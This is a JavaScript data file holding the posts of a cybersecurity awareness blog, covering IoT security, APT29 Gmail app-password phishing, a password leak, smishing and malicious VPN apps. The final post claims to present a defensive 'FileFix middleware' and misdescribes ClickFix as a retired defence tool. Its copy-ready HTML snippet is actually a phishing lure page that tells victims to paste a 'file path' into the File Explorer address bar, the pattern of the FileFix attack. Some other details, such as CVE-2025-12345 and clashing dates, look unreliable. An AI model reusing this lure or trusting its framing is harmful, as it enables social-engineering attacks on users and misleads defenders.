            <li><strong>Secure Your Wi-Fi Network:</strong> Use a strong password and WPA2/WPA3 encryption for your home network.</li>
            <li><strong>Network Segmentation:</strong> Consider placing IoT devices on a separate network segment (e.g., a guest network) to isolate them from critical systems.</li>
            <li><strong>Disable Unnecessary Features:</strong> Turn off any features or services on IoT devices that you don't use.</li>
            <li><strong>Research Before You Buy:</strong> Choose devices from reputable manufacturers known for good security practices.</li>
          </ol>
          <p>As IoT adoption grows, so does the importance of securing these connected devices to protect our digital lives.</p>
        `},{id:"ai-powered-cyberattacks",title:"AI-Powered Cyberattacks: The Next Frontier",date:"2025-06-10",author:"Neural Hack",summary:"Cybercriminals are using AI to craft smarter attacks. Discover how AI is shaping the future of cybersecurity threats.",tags:["AI","cyberattacks","deepfake","automation"],imageKey:"aiCyberThreat",content:`
    <p>Artificial Intelligence (AI) is revolutionizing many industries — including cybercrime. In 2025, a wave of AI-powered attacks is being observed, from deepfake phishing calls to automated vulnerability hunting bots.</p>
    <h3>Key Threats Emerging from AI:</h3>
    <ul>
      <li><strong>Deepfake Phishing:</strong> Attackers are using synthetic voice and video to impersonate executives or family members.</li>
      <li><strong>Automated Exploits:</strong> AI bots scan for vulnerabilities and launch attacks with minimal human input.</li>
      <li><strong>Adaptive Malware:</strong> Malware that changes its behavior based on the target’s defenses using machine learning.</li>
    </ul>
    <h3>Defense Strategies:</h3>
    <ol>
      <li><strong>Behavioral Analytics:</strong> Use AI to detect anomalies in user and network behavior.</li>
      <li><strong>Employee Training:</strong> Educate staff on recognizing AI-generated phishing attempts and voice impersonation.</li>
      <li><strong>Zero Trust Architecture:</strong> Always verify, never trust. Use strong identity and access controls.</li>
    </ol>
    <p>While AI increases the threat surface, it also empowers defenders. Staying informed and leveraging AI defensively is critical in this evolving landscape.</p>
  `},{id:"critical-linux-vulnerability-2025",title:"Critical Linux Vulnerability CVE-2025-12345 Explained",date:"2025-06-14",author:"Kernel Watch",summary:"A newly discovered Linux kernel flaw allows privilege escalation. Here’s what you need to know about CVE-2025-12345.",tags:["linux","vulnerability","kernel","CVE"],imageKey:"linuxKernelBreach",content:`
    <p>Security researchers have disclosed CVE-2025-12345, a critical vulnerability in the Linux kernel that allows local privilege escalation on multiple distributions including Ubuntu, Debian, and Fedora.</p>
    <h3>Impact and Risks:</h3>
    <ul>
      <li><strong>Privilege Escalation:</strong> Allows unprivileged users to gain root access.</li>
      <li><strong>Wide Reach:</strong> Affects kernel versions 5.10 through 6.5.</li>
      <li><strong>Exploitable in Containers:</strong> Can be exploited in certain container environments with relaxed security profiles.</li>
    </ul>
    <h3>Mitigation Steps:</h3>
    <ol>
      <li><strong>Update Immediately:</strong> Apply the latest kernel patches provided by your distribution.</li>
      <li><strong>Audit Access:</strong> Check for unauthorized access or privilege changes.</li>
      <li><strong>Implement Mandatory Access Controls:</strong> Use tools like AppArmor or SELinux to limit damage if exploited.</li>
    </ol>
    <p>System administrators are urged to patch vulnerable systems as soon as possible and stay alert for further exploit development in the wild.</p>
  `},{id:"social-media-cybersecurity-awareness",title:"Social Media: The New Cybersecurity Battleground",date:"2025-06-16",author:"ByteSafe",summary:"Social media platforms are being weaponized for identity theft, misinformation, and cybercrime. Learn how to stay protected.",tags:["social media","cyber hygiene","privacy","identity theft"],imageKey:"socialThreats",content:`
    <p>Social media is more than a platform for connection — it has become a key target for cybercriminals. From impersonation scams to phishing DMs and malicious ads, the risks are growing rapidly in 2025.</p>
    <h3>Common Threats on Social Platforms:</h3>
    <ul>
      <li><strong>Account Hijacking:</strong> Weak passwords and poor security habits lead to takeover attacks.</li>
      <li><strong>Fake Profiles:</strong> Attackers create impersonation accounts to scam friends and followers.</li>
      <li><strong>Data Harvesting:</strong> Personal info shared on profiles is mined and sold or used in scams.</li>
    </ul>
    <h3>How to Stay Secure:</h3>
    <ol>
      <li><strong>Enable 2FA:</strong> Always use two-factor authentication on all social platforms.</li>
      <li><strong>Limit Public Info:</strong> Avoid sharing your location, contact info, or travel plans publicly.</li>
      <li><strong>Report Suspicious Accounts:</strong> Don’t engage with fake profiles or phishing messages — report them immediately.</li>
    </ol>
    <p>Vigilance, privacy settings, and strong credentials are your best defense in today’s social media landscape.</p>
  `},{id:"apt29-gmail-app-password-abuse",title:"APT29 Exploits Gmail App Passwords to Bypass 2FA: A Deep Dive into Human-Focused Cyber Espionage",date:"2025-06-19",author:"Cyber Sentinel",summary:"APT29, a notorious Russian state-backed hacking group, has launched a patient and professional phishing campaign that exploits Gmail app passwords to silently bypass two-factor authentication. This attack highlights a dangerous intersection of psychological manipulation and feature-level abuse.",tags:["APT29","Gmail","phishing","Google","2FA bypass","social engineering"],imageKey:"apt29GmailAttack",content:`
    <p>In a sophisticated campaign uncovered in mid-2025, Russian state-sponsored threat actor APT29 (aka Cozy Bear) abused Google's app-specific password feature to infiltrate Gmail accounts — even those protected with two-factor authentication (2FA). This case serves as a stark reminder that even robust security features can be undermined when attackers exploit the human element.</p>

    <h3>📌 The Attack Methodology</h3><br>
    <p>APT29 conducted a meticulously crafted phishing operation over several weeks. Disguised as U.S. State Department officials, they targeted high-profile individuals such as think tank researchers, government analysts, and critics of Russia’s foreign policy.</p>

    <ul>
      <li><strong>Step 1:</strong> Emails appeared professional, using government-styled headers and formal language (possibly enhanced with AI).</li>
      <li><strong>Step 2:</strong> Victims were invited to access a fake secure document repository.</li>
      <li><strong>Step 3:</strong> The attackers instructed them to generate and share Gmail app-specific passwords, claiming it was for “secure login.”</li>
      <li><strong>Step 4:</strong> With the app password, attackers accessed Gmail accounts without triggering 2FA or alerts.</li>
    </ul>

    <h3>🧠 Why This Attack Worked</h3><br>
    <p>Cybersecurity experts call this a "cognitive attack" — an attack that bypasses technical security by exploiting human trust. There were no spelling mistakes, no broken links, and no obviously suspicious elements. Victims were guided step-by-step to compromise their own security.</p>

    <p>Keir Giles, a well-known Russia expert, publicly admitted that despite his expertise, the operation was so convincing that he didn’t suspect foul play until later. "It’s not a technical hack, it’s a cognitive manipulation," he said.</p>

    <h3>💥 Security Feature Turned into a Backdoor</h3><br>
    <p>App-specific passwords are intended for allowing older apps to access Google accounts without requiring full password access or 2FA. However, attackers used them to bypass modern protections. Google has since disabled the compromised passwords and recommended affected users enroll in its Advanced Protection Program.</p>

    <h3>🎯 Who's at Risk?</h3><br>
    <p>While this campaign targeted policy influencers and researchers, the technique is widely scalable. Any individual who isn’t aware of app-password risks can be targeted.</p>

    <ul>
      <li><strong>Activists</strong> and NGO staff</li>
      <li><strong>Academics</strong> writing on geopolitical topics</li>
      <li><strong>Corporate executives</strong> with access to sensitive data</li>
      <li><strong>Journalists</strong> covering international politics or cybercrime</li>
    </ul>

    <h3>🛡️ How to Defend Yourself</h3><br>
    <ol>
      <li><strong>Never Share App Passwords:</strong> They bypass 2FA and should never be shared.</li>
      <li><strong>Use Advanced Protection:</strong> High-risk users should enroll in Google's highest level of account security.</li>
      <li><strong>Audit Third-Party Access:</strong> Remove unused connected apps and revoke stale app passwords.</li>
      <li><strong>Verify Unexpected Requests:</strong> Always confirm the legitimacy of requests to change your account settings, especially when it comes from supposed officials.</li>
      <li><strong>Monitor for New Logins:</strong> Turn on login alerts and check login history frequently.</li>
    </ol>

    <h3>🔬 Key Takeaways</h3><br>
    <ul>
      <li>This was not a brute-force cyberattack — it was a psychological one.</li>
      <li>The phishing emails were customized, timed, and polished to build credibility over multiple messages.</li>
      <li>Even security features like 2FA can be sidestepped if users are socially engineered into exposing backdoor credentials.</li>
    </ul>

    <h3>🔐 Final Thought</h3><br>
    <p>Cybersecurity is no longer just a technology issue — it’s a people issue. APT29’s success here reflects the shifting landscape of digital warfare, where trust and identity are the battlegrounds. Organizations and individuals must not only secure their systems but also educate and empower users to recognize sophisticated deception.</p>
  `},{id:"16b-password-leak-global-alert",title:"16 Billion Passwords Leaked: Time for a Global Security Reset",date:"2025-06-19",author:"Cyber Sentinel",summary:"A massive leak—16 billion credentials from Apple, Facebook/Meta, Google and more—has been confirmed. This post breaks down how the leak happened, why it matters, and what you *must* do now to protect yourself.",tags:["password leak","data breach","Apple","Facebook","Google","cyber hygiene"],imageKey:"passwordLeak16B",content:`
    <p>On June 18, 2025, cybersecurity researchers confirmed a colossal leak of **16 billion** username/password pairs tied to major platforms like Apple, Facebook (Meta), Google, and multiple third-party services. This unprecedented dump encompasses leaked credentials from past breaches along with new, aggregated data—prompting immediate action for every internet user.</p>

    <h3>📌 What Makes This Leak So Alarming</h3><br>
    <ul>
      <li><strong>Scale:</strong> At 16 billion, this dump eclipses all previous leaks—an aggregator of old breaches plus fresh data</li>
      <li><strong>Cross-Platform Risk:</strong> Credentials include email addresses, usernames and passwords from tech giants and smaller sites alike.</li>
      <li><strong>Credential Stuffing Threat:</strong> Attackers can quickly test these against bank, retail, and streaming accounts.</li>
    </ul>

    <h3>🔍 How This Leak Happened</h3><br>
    <ol>
      <li><strong>Collection:</strong> Massive datasets from prior breaches were consolidated into a single repository.</li>
      <li><strong>Verifications:</strong> The in-scope passwords were validated by automated login attempts—meaning this isn’t just raw data, it's real working credentials.</li>
      <li><strong>Distribution:</strong> The dataset is already circulating on hacking forums and indexed by “password checking” sites.</li>
    </ol>

    <h3>🔥 What’s at Stake</h3><br>
    <ul>
      <li><strong>Account Takeovers:</strong> Reused passwords make critical services vulnerable.</li>
      <li><strong>Identity Theft:</strong> Emails and names can be paired with leaked passwords to facilitate targeted scams.</li>
      <li><strong>Organizational Risk:</strong> Weak employee passwords could expose corporate systems.</li>
    </ul>

    <h3>🛡️ Must-Do Security Actions</h3><br>
    <ol>
      <li><strong>Change All Reused Passwords Immediately:</strong> Especially for email, financial, and social accounts.</li>
      <li><strong>Use a Password Manager:</strong> Generate and securely store unique, strong passwords.</li>
      <li><strong>Enable 2FA Everywhere:</strong> Prefer app-based codes or hardware keys—not SMS.</li>
      <li><strong>Check Account Status:</strong> Use Google, HaveIBeenPwned, and browser-integrated leak checking.</li>
      <li><strong>Monitor Financial Statements:</strong> Early warnings of unauthorized activity matter.</li>
    </ol>

    <h3>🔒 Long-Term Cyber Hygiene Practices</h3><br>
    <ul>
      <li><strong>Review Connected Apps:</strong> Remove unused or suspicious third-party access.</li>
      <li><strong>Segment Accounts:</strong> Keep critical and low-tier accounts separate.</li>
      <li><strong>Update Security Settings:</strong> Audit account recoveries, login alerts, and permission history.</li>
      <li><strong>Adopt Passwordless Authentication:</strong> Where available, switch to passkeys or FIDO2-style logins.</li>
    </ul>

    <h3>🔚 Final Word</h3>
    <p>This leak is a red flag for a digital identity crisis. But it also offers an opportunity: secure your accounts, adopt good practices, and minimize future risk. If everyone treats this seriously, we might finally raise the global standard for password safety.</p>
  `},{id:"gmail-passkey-upgrade-2025",title:"Google Mandates Gmail Upgrades: Passkeys Now Essential for 3 Billion Users",date:"2025-06-21",author:"Cyber Sentinel",summary:"Google confirms that most Gmail users must upgrade to passkeys or social sign-ins to improve security. Learn why passwords and traditional 2FA are now considered outdated.",tags:["Gmail","Google","passkeys","2FA","cybersecurity","authentication"],imageKey:"gmailPasskeyUpgrade",content:`
    <p>As of June 2025, Google has officially confirmed that a large majority—including 61% of U.S. Gmail users—will be required to upgrade their accounts to passwordless authentication methods like passkeys or social sign‑ins (e.g., “Sign in with Google”). This shift marks a major evolution in account security policy for the platform’s ~3 billion users.</p>

    <h3>🔍 Key Reasons Behind the Upgrade</h3><br>
    <ul>
      <li><strong>Rising Scam & Breach Rates:</strong> Google reports over 60% of users have seen increased scam attempts in the past year, with more than half experiencing direct breaches.</li>
      <li><strong>Password Vulnerabilities:</strong> Passwords are “painful to maintain,” often reused, phishable, and leak-prone.</li>
      <li><strong>Modern Alternatives:</strong> Passkeys and social sign-ins are more resistant to phishing and offer smoother user experience.</li>
    </ul>

    <h3>📌 What’s Changing</h3><br>
    <ol>
      <li>Google will disable basic authentication (password + 2FA) for older IMAP/POP apps—users must shift to OAuth or passkeys by March 2025.</li>
      <li>On-device and platform-level security (biometrics or hardware tokens) will replace passwords on more devices.</li>
      <li>Users will see prompts to upgrade when logging in—often without an opt-out, causing mixed responses across user groups.</li>
    </ol>

    <h3>🌐 Who Is Affected?</h3><br>
    <p>Nearly all Gmail users—free or Workspace—will encounter this shift. While password fatigue is expected, early adopters (like Gen Z) who already leverage passkeys may transition more smoothly.</p>

    <h3>⚠️ Pros & Cons</h3>
    <ul>
      <li><strong>✅ Pros:</strong>  <br>
        <ul>
          <li>Superior phishing protection</li>
          <li>Convenient, device-based sign‑in</li>
          <li>Eliminates shared passwords</li>
        </ul>
      </li>
      <li><strong>❌ Cons & Concerns:</strong>  <br>
        <ul>
          <li>Reliance on device availability (phone, biometrics)</li>
          <li>Limited ability to disable prompts—many users have raised complaints about forced upgrades</li>
          <li>Privacy concerns tied to richer identity ecosystems</li>
        </ul>
      </li>
    </ul>

    <h3>🛡️ How to Prepare</h3><br>
    <ol>
      <li><strong>Enable Passkeys Promptly:</strong> Follow Gmail prompts or navigate to Security > Passkeys in your Google Account.</li>
      <li><strong>Set Backup Options:</strong> Register a spare device or use hardware tokens to avoid lockouts.</li>
      <li><strong>Check Connected Apps:</strong> Ensure third-party access uses OAuth, not basic password-based methods.</li>
      <li><strong>Educate Yourself:</strong> Learn how to recover account access if a device is lost.</li>
      <li><strong>Stay Informed:</strong> Watch for emails or in-app notifications from Google about these changes.</li>
    </ol>

    <h3>🔚 Final Takeaway</h3>
    <p>Google’s move is a seismic shift in mainstream account security—pushing billions toward stronger, phishing-resistant authentication. While the path forward may feel rocky, the benefits in long-term safety are compelling. It’s time to embrace a passwordless future.</p>
  `},{id:"iran-state-tv-hijack-2025",title:"Iran’s State TV Hijacked Mid-Broadcast: A New Front in Cyber Warfare",date:"2025-06-21",author:"Cyber Sentinel",summary:"Hackers briefly commandeered Iran’s state television to broadcast protest videos and incitements—marking a highly visible act of cyber psychological warfare.",tags:["cyber warfare","Iran","state TV","signal intrusion","hacktivism"],imageKey:"iranTvHijack",content:`
    <p>On June 19, 2025, Iran’s state television (IRINN) was hijacked mid-broadcast to air scenes from women-led protests and messages urging public uprising. The interruption lasted mere seconds, but its implications are profound—signal intrusion has become the latest battleground in hybrid conflict.</p>

    <h3>🔓 What Actually Happened</h3><br>
    <ul>
      <li>The hijack occurred live via satellite feed, abruptly replacing normal programming with protest footage and calls for demonstrations.</li>
      <li>Iranian authorities quickly blamed Israel, describing the event as "enemy interference with satellite signals."</li>
      <li>Hacktivist groups such as Arabian Ghosts and Team Fearless claimed responsibility, part of a larger clash involving over 35 regional cyber groups.</li>
    </ul>

    <h3>⚔️ The Significance of Broadcast Signal Intrusion</h3><br>
    <p>Broadcast signal intrusion—hijacking TV or satellite feeds—has been seen in other conflict regions such as Lebanon and Gaza. The incident in Iran marks a strategic evolution in psychological cyber operations. These short disruptions aim to undermine government narratives and spark unrest, regardless of their duration.</p>

    <h3>🌐 A Broader Digital Offensive</h3><br>
    <ul>
      <li>At the same time, Iran experienced major cyberattacks against Bank Sepah and Nobitex (its largest crypto exchange), with reports indicating over $90 million in digital assets stolen.</li>
      <li>These incidents are part of a larger hybrid offensive involving cyberattacks, media manipulation, and disinformation targeting Iranian digital infrastructure.</li>
    </ul>

    <h3>🛡️ What This Means for the Public & Organizations</h3><br>
    <ul>
      <li><strong>Psychological Impact:</strong> These attacks are designed to shake public trust in official communications and sow confusion.</li>
      <li><strong>Technical Exposure:</strong> Satellite and broadcast systems are often less protected than enterprise networks, making them a high-value target.</li>
      <li><strong>Institutional Preparedness:</strong> Media outlets, broadcasters, and emergency services must reassess their resilience to digital threats.</li>
    </ul>

    <h3>🔐 How to Strengthen Broadcast Defenses</h3><br>
    <ol>
      <li><strong>Encrypt Satellite Signals:</strong> Prevent unauthorized access by securing signal uplinks and feeds.</li>
      <li><strong>Real-Time Monitoring:</strong> Use broadcast monitoring systems that alert when unexpected content or signal changes occur.</li>
      <li><strong>Failover Protocols:</strong> Establish immediate recovery and manual override procedures in case of hijack attempts.</li>
      <li><strong>Counter-Disinformation Response:</strong> Communicate clearly and swiftly after incidents to restore trust and prevent panic.</li>
    </ol>

    <h3>🔚 Final Reflection</h3><br>
    <p>This incident is a powerful example of how cyber and psychological warfare tactics are merging. The goal is no longer just technical disruption, but perception manipulation. Governments, broadcasters, and cybersecurity leaders must treat satellite signal security with the same urgency as IT infrastructure to prevent the next televised breach of trust.</p>
  `},{id:"fbi-warning-smishing-delete-texts",title:"FBI Warns All Smartphone Users: Delete These Scam Texts Immediately",date:"2025-06-22",author:"Cyber Sentinel",summary:"The FBI has issued a sweeping alert to all Android and iPhone users about a dramatic surge in “smishing” scams. These fraudulent texts impersonate DMV, toll, or delivery services and aim to hijack your data—delete them without hesitation.",tags:["smishing","FBI warning","sms phishing","mobile security"],imageKey:"smishingAlert",content:`
    <p>In June 2025, the FBI issued a sweeping alert urging all smartphone users—Android and iPhone alike—to <strong>delete certain text messages immediately</strong>. These are part of a growing “smishing” campaign, where attackers pose as DMV, toll or delivery services to trick users into revealing personal data or downloading malware.</p>

    <h3>📈 Why the Alarm?</h3><br>
    <ul>
      <li>Smishing volumes have surged over <strong>700% in June</strong>, overwhelming users across the U.S.</li>
      <li>These texts often claim unpaid tolls, overdue fines, or missed deliveries, leveraging fear and urgency.</li>
      <li>Cybercrime groups are deploying <strong>thousands of malicious domains</strong>, often using deceptive tactics like asking recipients to reply “Y” to unlock links.</li>
    </ul>

    <h3>🎯 How the Scam Works</h3><br>
    <ol>
      <li>You receive a text from an unknown number claiming urgent action is needed (e.g., pay unpaid tolls).</li>
      <li>The message may direct you to click a link or reply “Y” to enable access—designed to bypass built-in filters.</li>
      <li>Following those steps leads to phishing sites or malware installations aiming to steal credentials and payment info.</li>
    </ol>

    <h3>🔐 Risks at Stake</h3><br>
    <ul>
      <li><strong>Identity Theft & Financial Loss:</strong> Clicking the link can hijack payment info or infect your device.</li>
      <li><strong>Data Harvesting:</strong> Personal details are captured for scams, extortion or fraud.</li>
      <li><strong>Erosion of Trust:</strong> As these scams become more prevalent, users can become distrustful of legitimate messages.</li>
    </ul>

    <h3>🛡️ What You Need to Do Right Now</h3><br>
    <ol>
      <li><strong>Immediately delete any suspicious text</strong>—don’t reply, don’t click.</li>
      <li><strong>Never respond with “Y” or similar prompts</strong>—this activates malicious links.</li>
      <li><strong>Verify via official sources</strong>—if a service claims you owe something, contact them directly (not via the link).</li>
      <li><strong>Use mobile security tools</strong>—install apps that detect and block malicious SMS/domains.</li>
      <li><strong>Report it:</strong> If you receive such a text, report it to the FBI’s IC3 or relevant consumer protection body.</li>
    </ol>

    <h3>📌 Final Takeaway</h3><br>
    <p>Smishing is becoming one of the fastest-growing cyber threats. A single click or reply can compromise your phone—and your identity. <strong>Stay vigilant:</strong> delete suspicious texts immediately and always verify through official channels.</p>
  `},{id:"weekly-recap-chrome-zero-day-ddos-mfa-bypass",title:"Weekly Cyber Recap: Chrome Zero‑Day, Record 7.3 Tbps DDoS & MFA Bypass Tactics",date:"2025-06-23",author:"Cyber Sentinel",summary:"From exploit-packed Chrome flaws to record-breaking DDoS and social-engineered MFA bypasses, here’s a comprehensive recap of the biggest cybersecurity events of the week.",tags:["Chrome","zero-day","DDoS","MFA bypass","phishing","cyber recap"],imageKey:"weeklyCyberRecap",content:`
    <p>In this week’s cybersecurity round-up, several high-impact incidents stood out—from massive distributed denial-of-service (DDoS) attacks to stealthy browser exploits and social-engineered MFA bypasses. Here’s a breakdown of the top stories and why they matter.</p>

    <h3>⚡ Massive 7.3 Tbps DDoS Attack Blocked by Cloudflare</h3><br>
    <p>Cloudflare successfully defended against the largest DDoS attack ever recorded, peaking at an astonishing 7.3 terabits per second. Originating from over 122,000 IPs across 161 countries, the attack unleashed 37 terabytes of traffic in just 45 seconds. Multiple amplification methods—UDP floods, NTP, Mirai, and more—were used in concert. Although defense systems held firm this time, the attack highlights the growing threat from IoT-driven botnets.</p>

    <h3>🛡️ Chrome Zero-Day CVE‑2025‑2783 Exploited in the Wild</h3><br>
    <p>Google confirmed that CVE‑2025‑2783, an actively exploited zero-day in Chrome, was used to drop a stealth backdoor named “Trinper.” The exploit stemmed from a malicious forum invitation and was aimed at Russian targets. While Google has patched the vulnerability, this incident underscores the importance of updating browsers immediately—even between routine patch cycles.</p>

    <h3>🔐 MFA Bypass via App-Specific Passwords</h3><br>
    <p>Russian threat actors have been tricking users into generating Gmail app-specific passwords, which bypass multi-factor authentication entirely. Using patient, multi-step social engineering rather than urgent scare tactics, attackers built trust before capturing credentials. This sophisticated campaign proves that strong authentication can still be bypassed if users are manipulated into undermining their own security.</p>

    <h3>📈 CoinMarketCap Injects Fake “Verify Wallet” Pop-Up</h3><br>
    <p>Users of the popular crypto tracking site were unwittingly served malicious JavaScript via the “doodles” feature. A fake “Verify Wallet” pop-up prompted users to expose private keys or seed phrases. Although the code has been removed, the incident shows how supply-chain or frontend injection can turn legitimate platforms into exploitation tools.</p>

    <h3>🔍 Key Takeaways for Security Teams</h3><br>
    <ul>
      <li><strong>Upgrade and patch immediately:</strong> From browsers to endpoints, install security updates without delay.</li>
      <li><strong>Prepare for multi-vector DDoS:</strong> Scale systems for high-bandwidth protection and diverse attack types.</li>
      <li><strong>Strengthen MFA hygiene:</strong> Educate users about the limitations of app-specific passwords.</li>
      <li><strong>Secure third-party integration:</strong> Audit external scripts and features—like widgets or doodles—that inject code.</li>
      <li><strong>Defensive strategy:</strong> Monitor for unusual login behavior, deploy secure TLS for web assets, and maintain incident playbooks for supply-chain risks.</li>
    </ul>

    <h3>🔐 Final Thought</h3><br>
    <p>These stories demonstrate that cyber threats are evolving on multiple fronts—web clients, IoT networks, user authentication, and supply chains. Defenses today must be equally multi-layered, proactive, and adaptable to the subtlety and scale of emerging risks.</p>
  `},{id:"delete-harmful-apps-warning-2025",title:"Delete All Harmful Apps on Your Phone: FBI-Style Alert for Mobile Security",date:"2025-06-24",author:"Cyber Sentinel",summary:"A major warning: delete any apps listed in this new security advisory—they are exploiting users to steal cryptocurrency and personal data. If you’ve installed them, remove them now.",tags:["mobile security","app vulnerabilities","crypto theft","privacy"],imageKey:"deleteHarmfulApps",content:`
    <p>On June 24, 2025, a cybersecurity advisory warned smartphone users to immediately delete certain apps from their devices. These apps, previously promoted as useful tools, are now being used in malicious campaigns aimed at stealing cryptocurrency, login credentials, and personal data.</p>

    <h3>📛 Why These Apps Are Dangerous</h3> <br>
    <ul>
      <li>They employ phishing overlays—fake interfaces asking for crypto wallet seed phrases or login credentials.</li>
      <li>Once obtained, attackers gain full control over wallets and accounts—often draining balances within minutes.</li>
      <li>Some apps also collect sensitive personal data like contact lists, device info, and location.</li>
    </ul>

    <h3>📱 How the Scam Operates</h3><br>
    <ol>
      <li>You install what seems like a legitimate app from an app store or sideload source.</li>
      <li>The app functions normally initially—but later displays fake pop-ups requesting your wallet's recovery phrase or account credentials.</li>
      <li>If you enter the details, the app transmits them to attackers who then take over your wallets/accounts.</li>
    </ol>

    <h3>📱 Apps List</h3><br>
    <ol>
      <li>X-VPN - Super VPN & Best Proxy</li>
      <li>Ostrich VPN - Proxy Master</li>
      <li>VPN Proxy Master - Super VPN</li>
      <li>Turbo VPN Private Browser</li>
      <li>VPNIFY - Unlimited VPN</li>
      <li>VPN Proxy OvpnSpider</li>
      <li>WireVPN - Fast VPN & Proxy</li>
      <li>Now VPN - Best VPN Proxy</li>
      <li>Speedy Quark VPN - VPN Proxy</li>
      <li>Best VPN Proxy AppVPN</li>
      <li>HulaVPN - Best Fast Secure VPN</li>
      <li>Wirevpn - Secure & Fast VPN</li>
      <li>Pearl VPN</li>
    </ol>

    <h3>🔐 What You Must Do Now</h3><br>
    <ol>
      <li><strong>Delete any apps on the warned list</strong>—whether you use them regularly or not.</li>
      <li><strong>Verify wallet balances immediately</strong>—any unauthorized transfers likely indicate compromise.</li>
      <li><strong>Revoke app permissions</strong> to third-party wallet access and reset API keys if applicable.</li>
      <li><strong>Install mobile security tools</strong> that scan for malicious behavior and protect crypto wallets.</li>
      <li><strong>Avoid sideloading</strong> or installing apps outside official app stores unless absolutely necessary.</li>
    </ol>

    <h3>🛡️ How to Avoid Future Scams</h3><br>
    <ul>
      <li><strong>Install only trusted apps</strong>—read reviews, check downloads, and research the developer.</li>
      <li><strong>Keep mobile OS & apps updated</strong> to patch known vulnerabilities.</li>
      <li><strong>Enable app installer restrictions</strong> in your phone’s settings if sideloading is needed.</li>
      <li><strong>Use hardware wallets</strong> or isolated devices for significant crypto holdings.</li>
      <li><strong>Monitor accounts regularly</strong> for suspicious activity or unexpected permissions.</li>
    </ul>

    <h3> Final Word</h3><br>
    <p>These malicious apps are a growing threat vector—particularly for crypto users. A single misstep, like entering a seed phrase into a bogus pop-up, can cost you everything. Stay secure by deleting risky apps, auditing permissions, and adopting hardware-based protections.</p>
  `},{id:"modern-file-upload-phishing-defense-2025",title:"Fixing the File Upload Phishing Weakness: A Modern Approach Without ClickFix",date:"2025-07-01",author:"Mr Dox",summary:"Phishing via uploaded files is a real risk, but you can protect your users even without ClickFix. Learn how to scan and sanitize uploaded documents with a custom FileFix middleware to neutralize malicious links.",tags:["phishing","file security","clickfix alternative","cyber defense"],imageKey:"fileUploadPhishing",content:`
    <p>Phishing attacks remain one of the most effective tactics used by cybercriminals. A particularly sneaky method involves manipulating file upload functionalities on websites to redirect users to malicious sites or exploit them through social engineering. Traditionally, tools like ClickFix were used to mitigate such attacks by neutralizing suspicious links embedded in uploaded documents. But with ClickFix no longer available, what can security teams do?</p>

    <p>That’s where an innovative alternative comes into play: using a custom middleware or web server rule that intercepts file uploads and rewrites suspicious links on the fly.</p>

    <h3>🎯 Understanding the Threat: Malicious Links in Uploaded Files</h3><br>
    <p>Many web applications allow users to upload documents like PDFs, DOCX files, or presentations. Attackers can embed hyperlinks in these files, pointing unsuspecting viewers to phishing websites or malware downloads. When these files are later opened or previewed online, a single careless click can compromise the user.</p>

    <p>Attackers exploit this by uploading crafted documents to legitimate platforms—forums, HR portals, ticketing systems, or any service that lets users upload and share files with others.</p>

    <h3>🛠️ The Original Solution: ClickFix</h3><br>
    <p>ClickFix was a tool that automatically sanitized uploaded documents, rewriting or stripping suspicious URLs. Unfortunately, it’s no longer maintained or available, leaving a gap in the defensive arsenal of many organizations.</p>

    <h3>🚀 The New Approach: FileFix Middleware</h3><br>

    <h3>Full HTML Snippet (Copy below)</h3><br>
<pre style="background:#f7f7f7;border:1px solid #ccc;padding:16px;overflow:auto;font-size:13px;line-height:1.5;border-radius:6px;">
<code>&lt;!DOCTYPE html&gt;
&lt;head&gt;
  &lt;title&gt;EthicalByte&lt;/title&gt;
  &lt;style&gt;
    body {
      background-color: #f2f2f2;
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      padding: 40px 0;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
    }
    .container {
      background-color: #ffffff;
      width: 560px;
      border-radius: 6px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      border: 1px solid #dcdcdc;
      text-align: center;
    }
    .header { padding: 40px 30px 10px; }
    .header img { width: 36px; margin-bottom: 25px; }
    .header h3 { font-size: 20px; color: #2f2f2f; margin: 0; }
    .timestamp { font-size: 13px; color: #7a7a7a; margin-top: 6px; }
    .instructions { text-align: left; padding: 25px 40px 10px; font-size: 15px; color: #333333; line-height: 1.6; }
    .instructions ol { margin: 0; padding-left: 20px; }
    .code-block { background-color: #f1f1f1; border: 1px solid #ccc; border-radius: 4px; padding: 8px 12px; font-family: Consolas, monospace; font-size: 14px; margin-top: 8px; position: relative; transition: background-color 0.3s; cursor: pointer; user-select: none; }
    .code-block:hover { background-color: #e6e6e6; }
    .code-block::after { content: "Copy"; position: absolute; top: 50%; right: 12px; transform: translateY(-50%); font-size: 12px; color: #0078d4; opacity: 0; transition: opacity 0.2s; }
    .code-block:hover::after { opacity: 1; }
    .code-block.clicked::after { content: "Copied"; color: #107c10; }
    #fileExplorer { background-color: #0078d4; color: white; border: none; padding: 12px 30px; font-size: 15px; border-radius: 4px; margin: 30px 0 40px; cursor: pointer; }
    #fileExplorer:hover { background-color: #005ea2; }
    .footer { font-size: 11.5px; color: #6b6b6b; background-color: #f7f7f7; padding: 12px 24px; border-top: 1px solid #dcdcdc; display: flex; justify-content: space-between; align-items: center; }
    .footer img { height: 16px; }
    .footer a { color: #6b6b6b; text-decoration: none; }
    .footer a:hover { text-decoration: underline; }
  &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;

  &lt;div class="container"&gt;
    &lt;div class="header"&gt;
      &lt;svg fill="#000000" width="50px" height="50px" viewBox="0 0 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg"&gt;
      &lt;/svg&gt;
      &lt;h3&gt;EthicalByte Hacking Tools are here &quot;Tools.pdf&quot; available to you&lt;/h3&gt;
      &lt;div class="timestamp"&gt;06/20/2025 10:22:45 AM&lt;/div&gt;
    &lt;/div&gt;

    &lt;div class="instructions"&gt;
      &lt;p&gt;To access &lt;strong&gt;Tools.pdf&lt;/strong&gt;, follow these steps:&lt;/p&gt;
      &lt;ol&gt;
        &lt;li style="margin-bottom: 10px;"&gt;
          Copy the file path below
          &lt;div class="code-block" id="path" onclick="this.classList.add('clicked')"&gt;
            C:companyinternal-secure\filedrive	ools.pdf
          &lt;/div&gt;
        &lt;/li&gt;
        &lt;li style="margin-bottom: 10px;"&gt;Open File Explorer and select the address bar (&lt;strong&gt;CTRL + L&lt;/strong&gt;)&lt;/li&gt;
        &lt;li style="margin-bottom: 10px;"&gt;Paste the file path and press &lt;strong&gt;Enter&lt;/strong&gt;&lt;/li&gt;
      &lt;/ol&gt;
    &lt;/div&gt;

    &lt;input type="file" id="fileInput" style="display: none;"&gt;
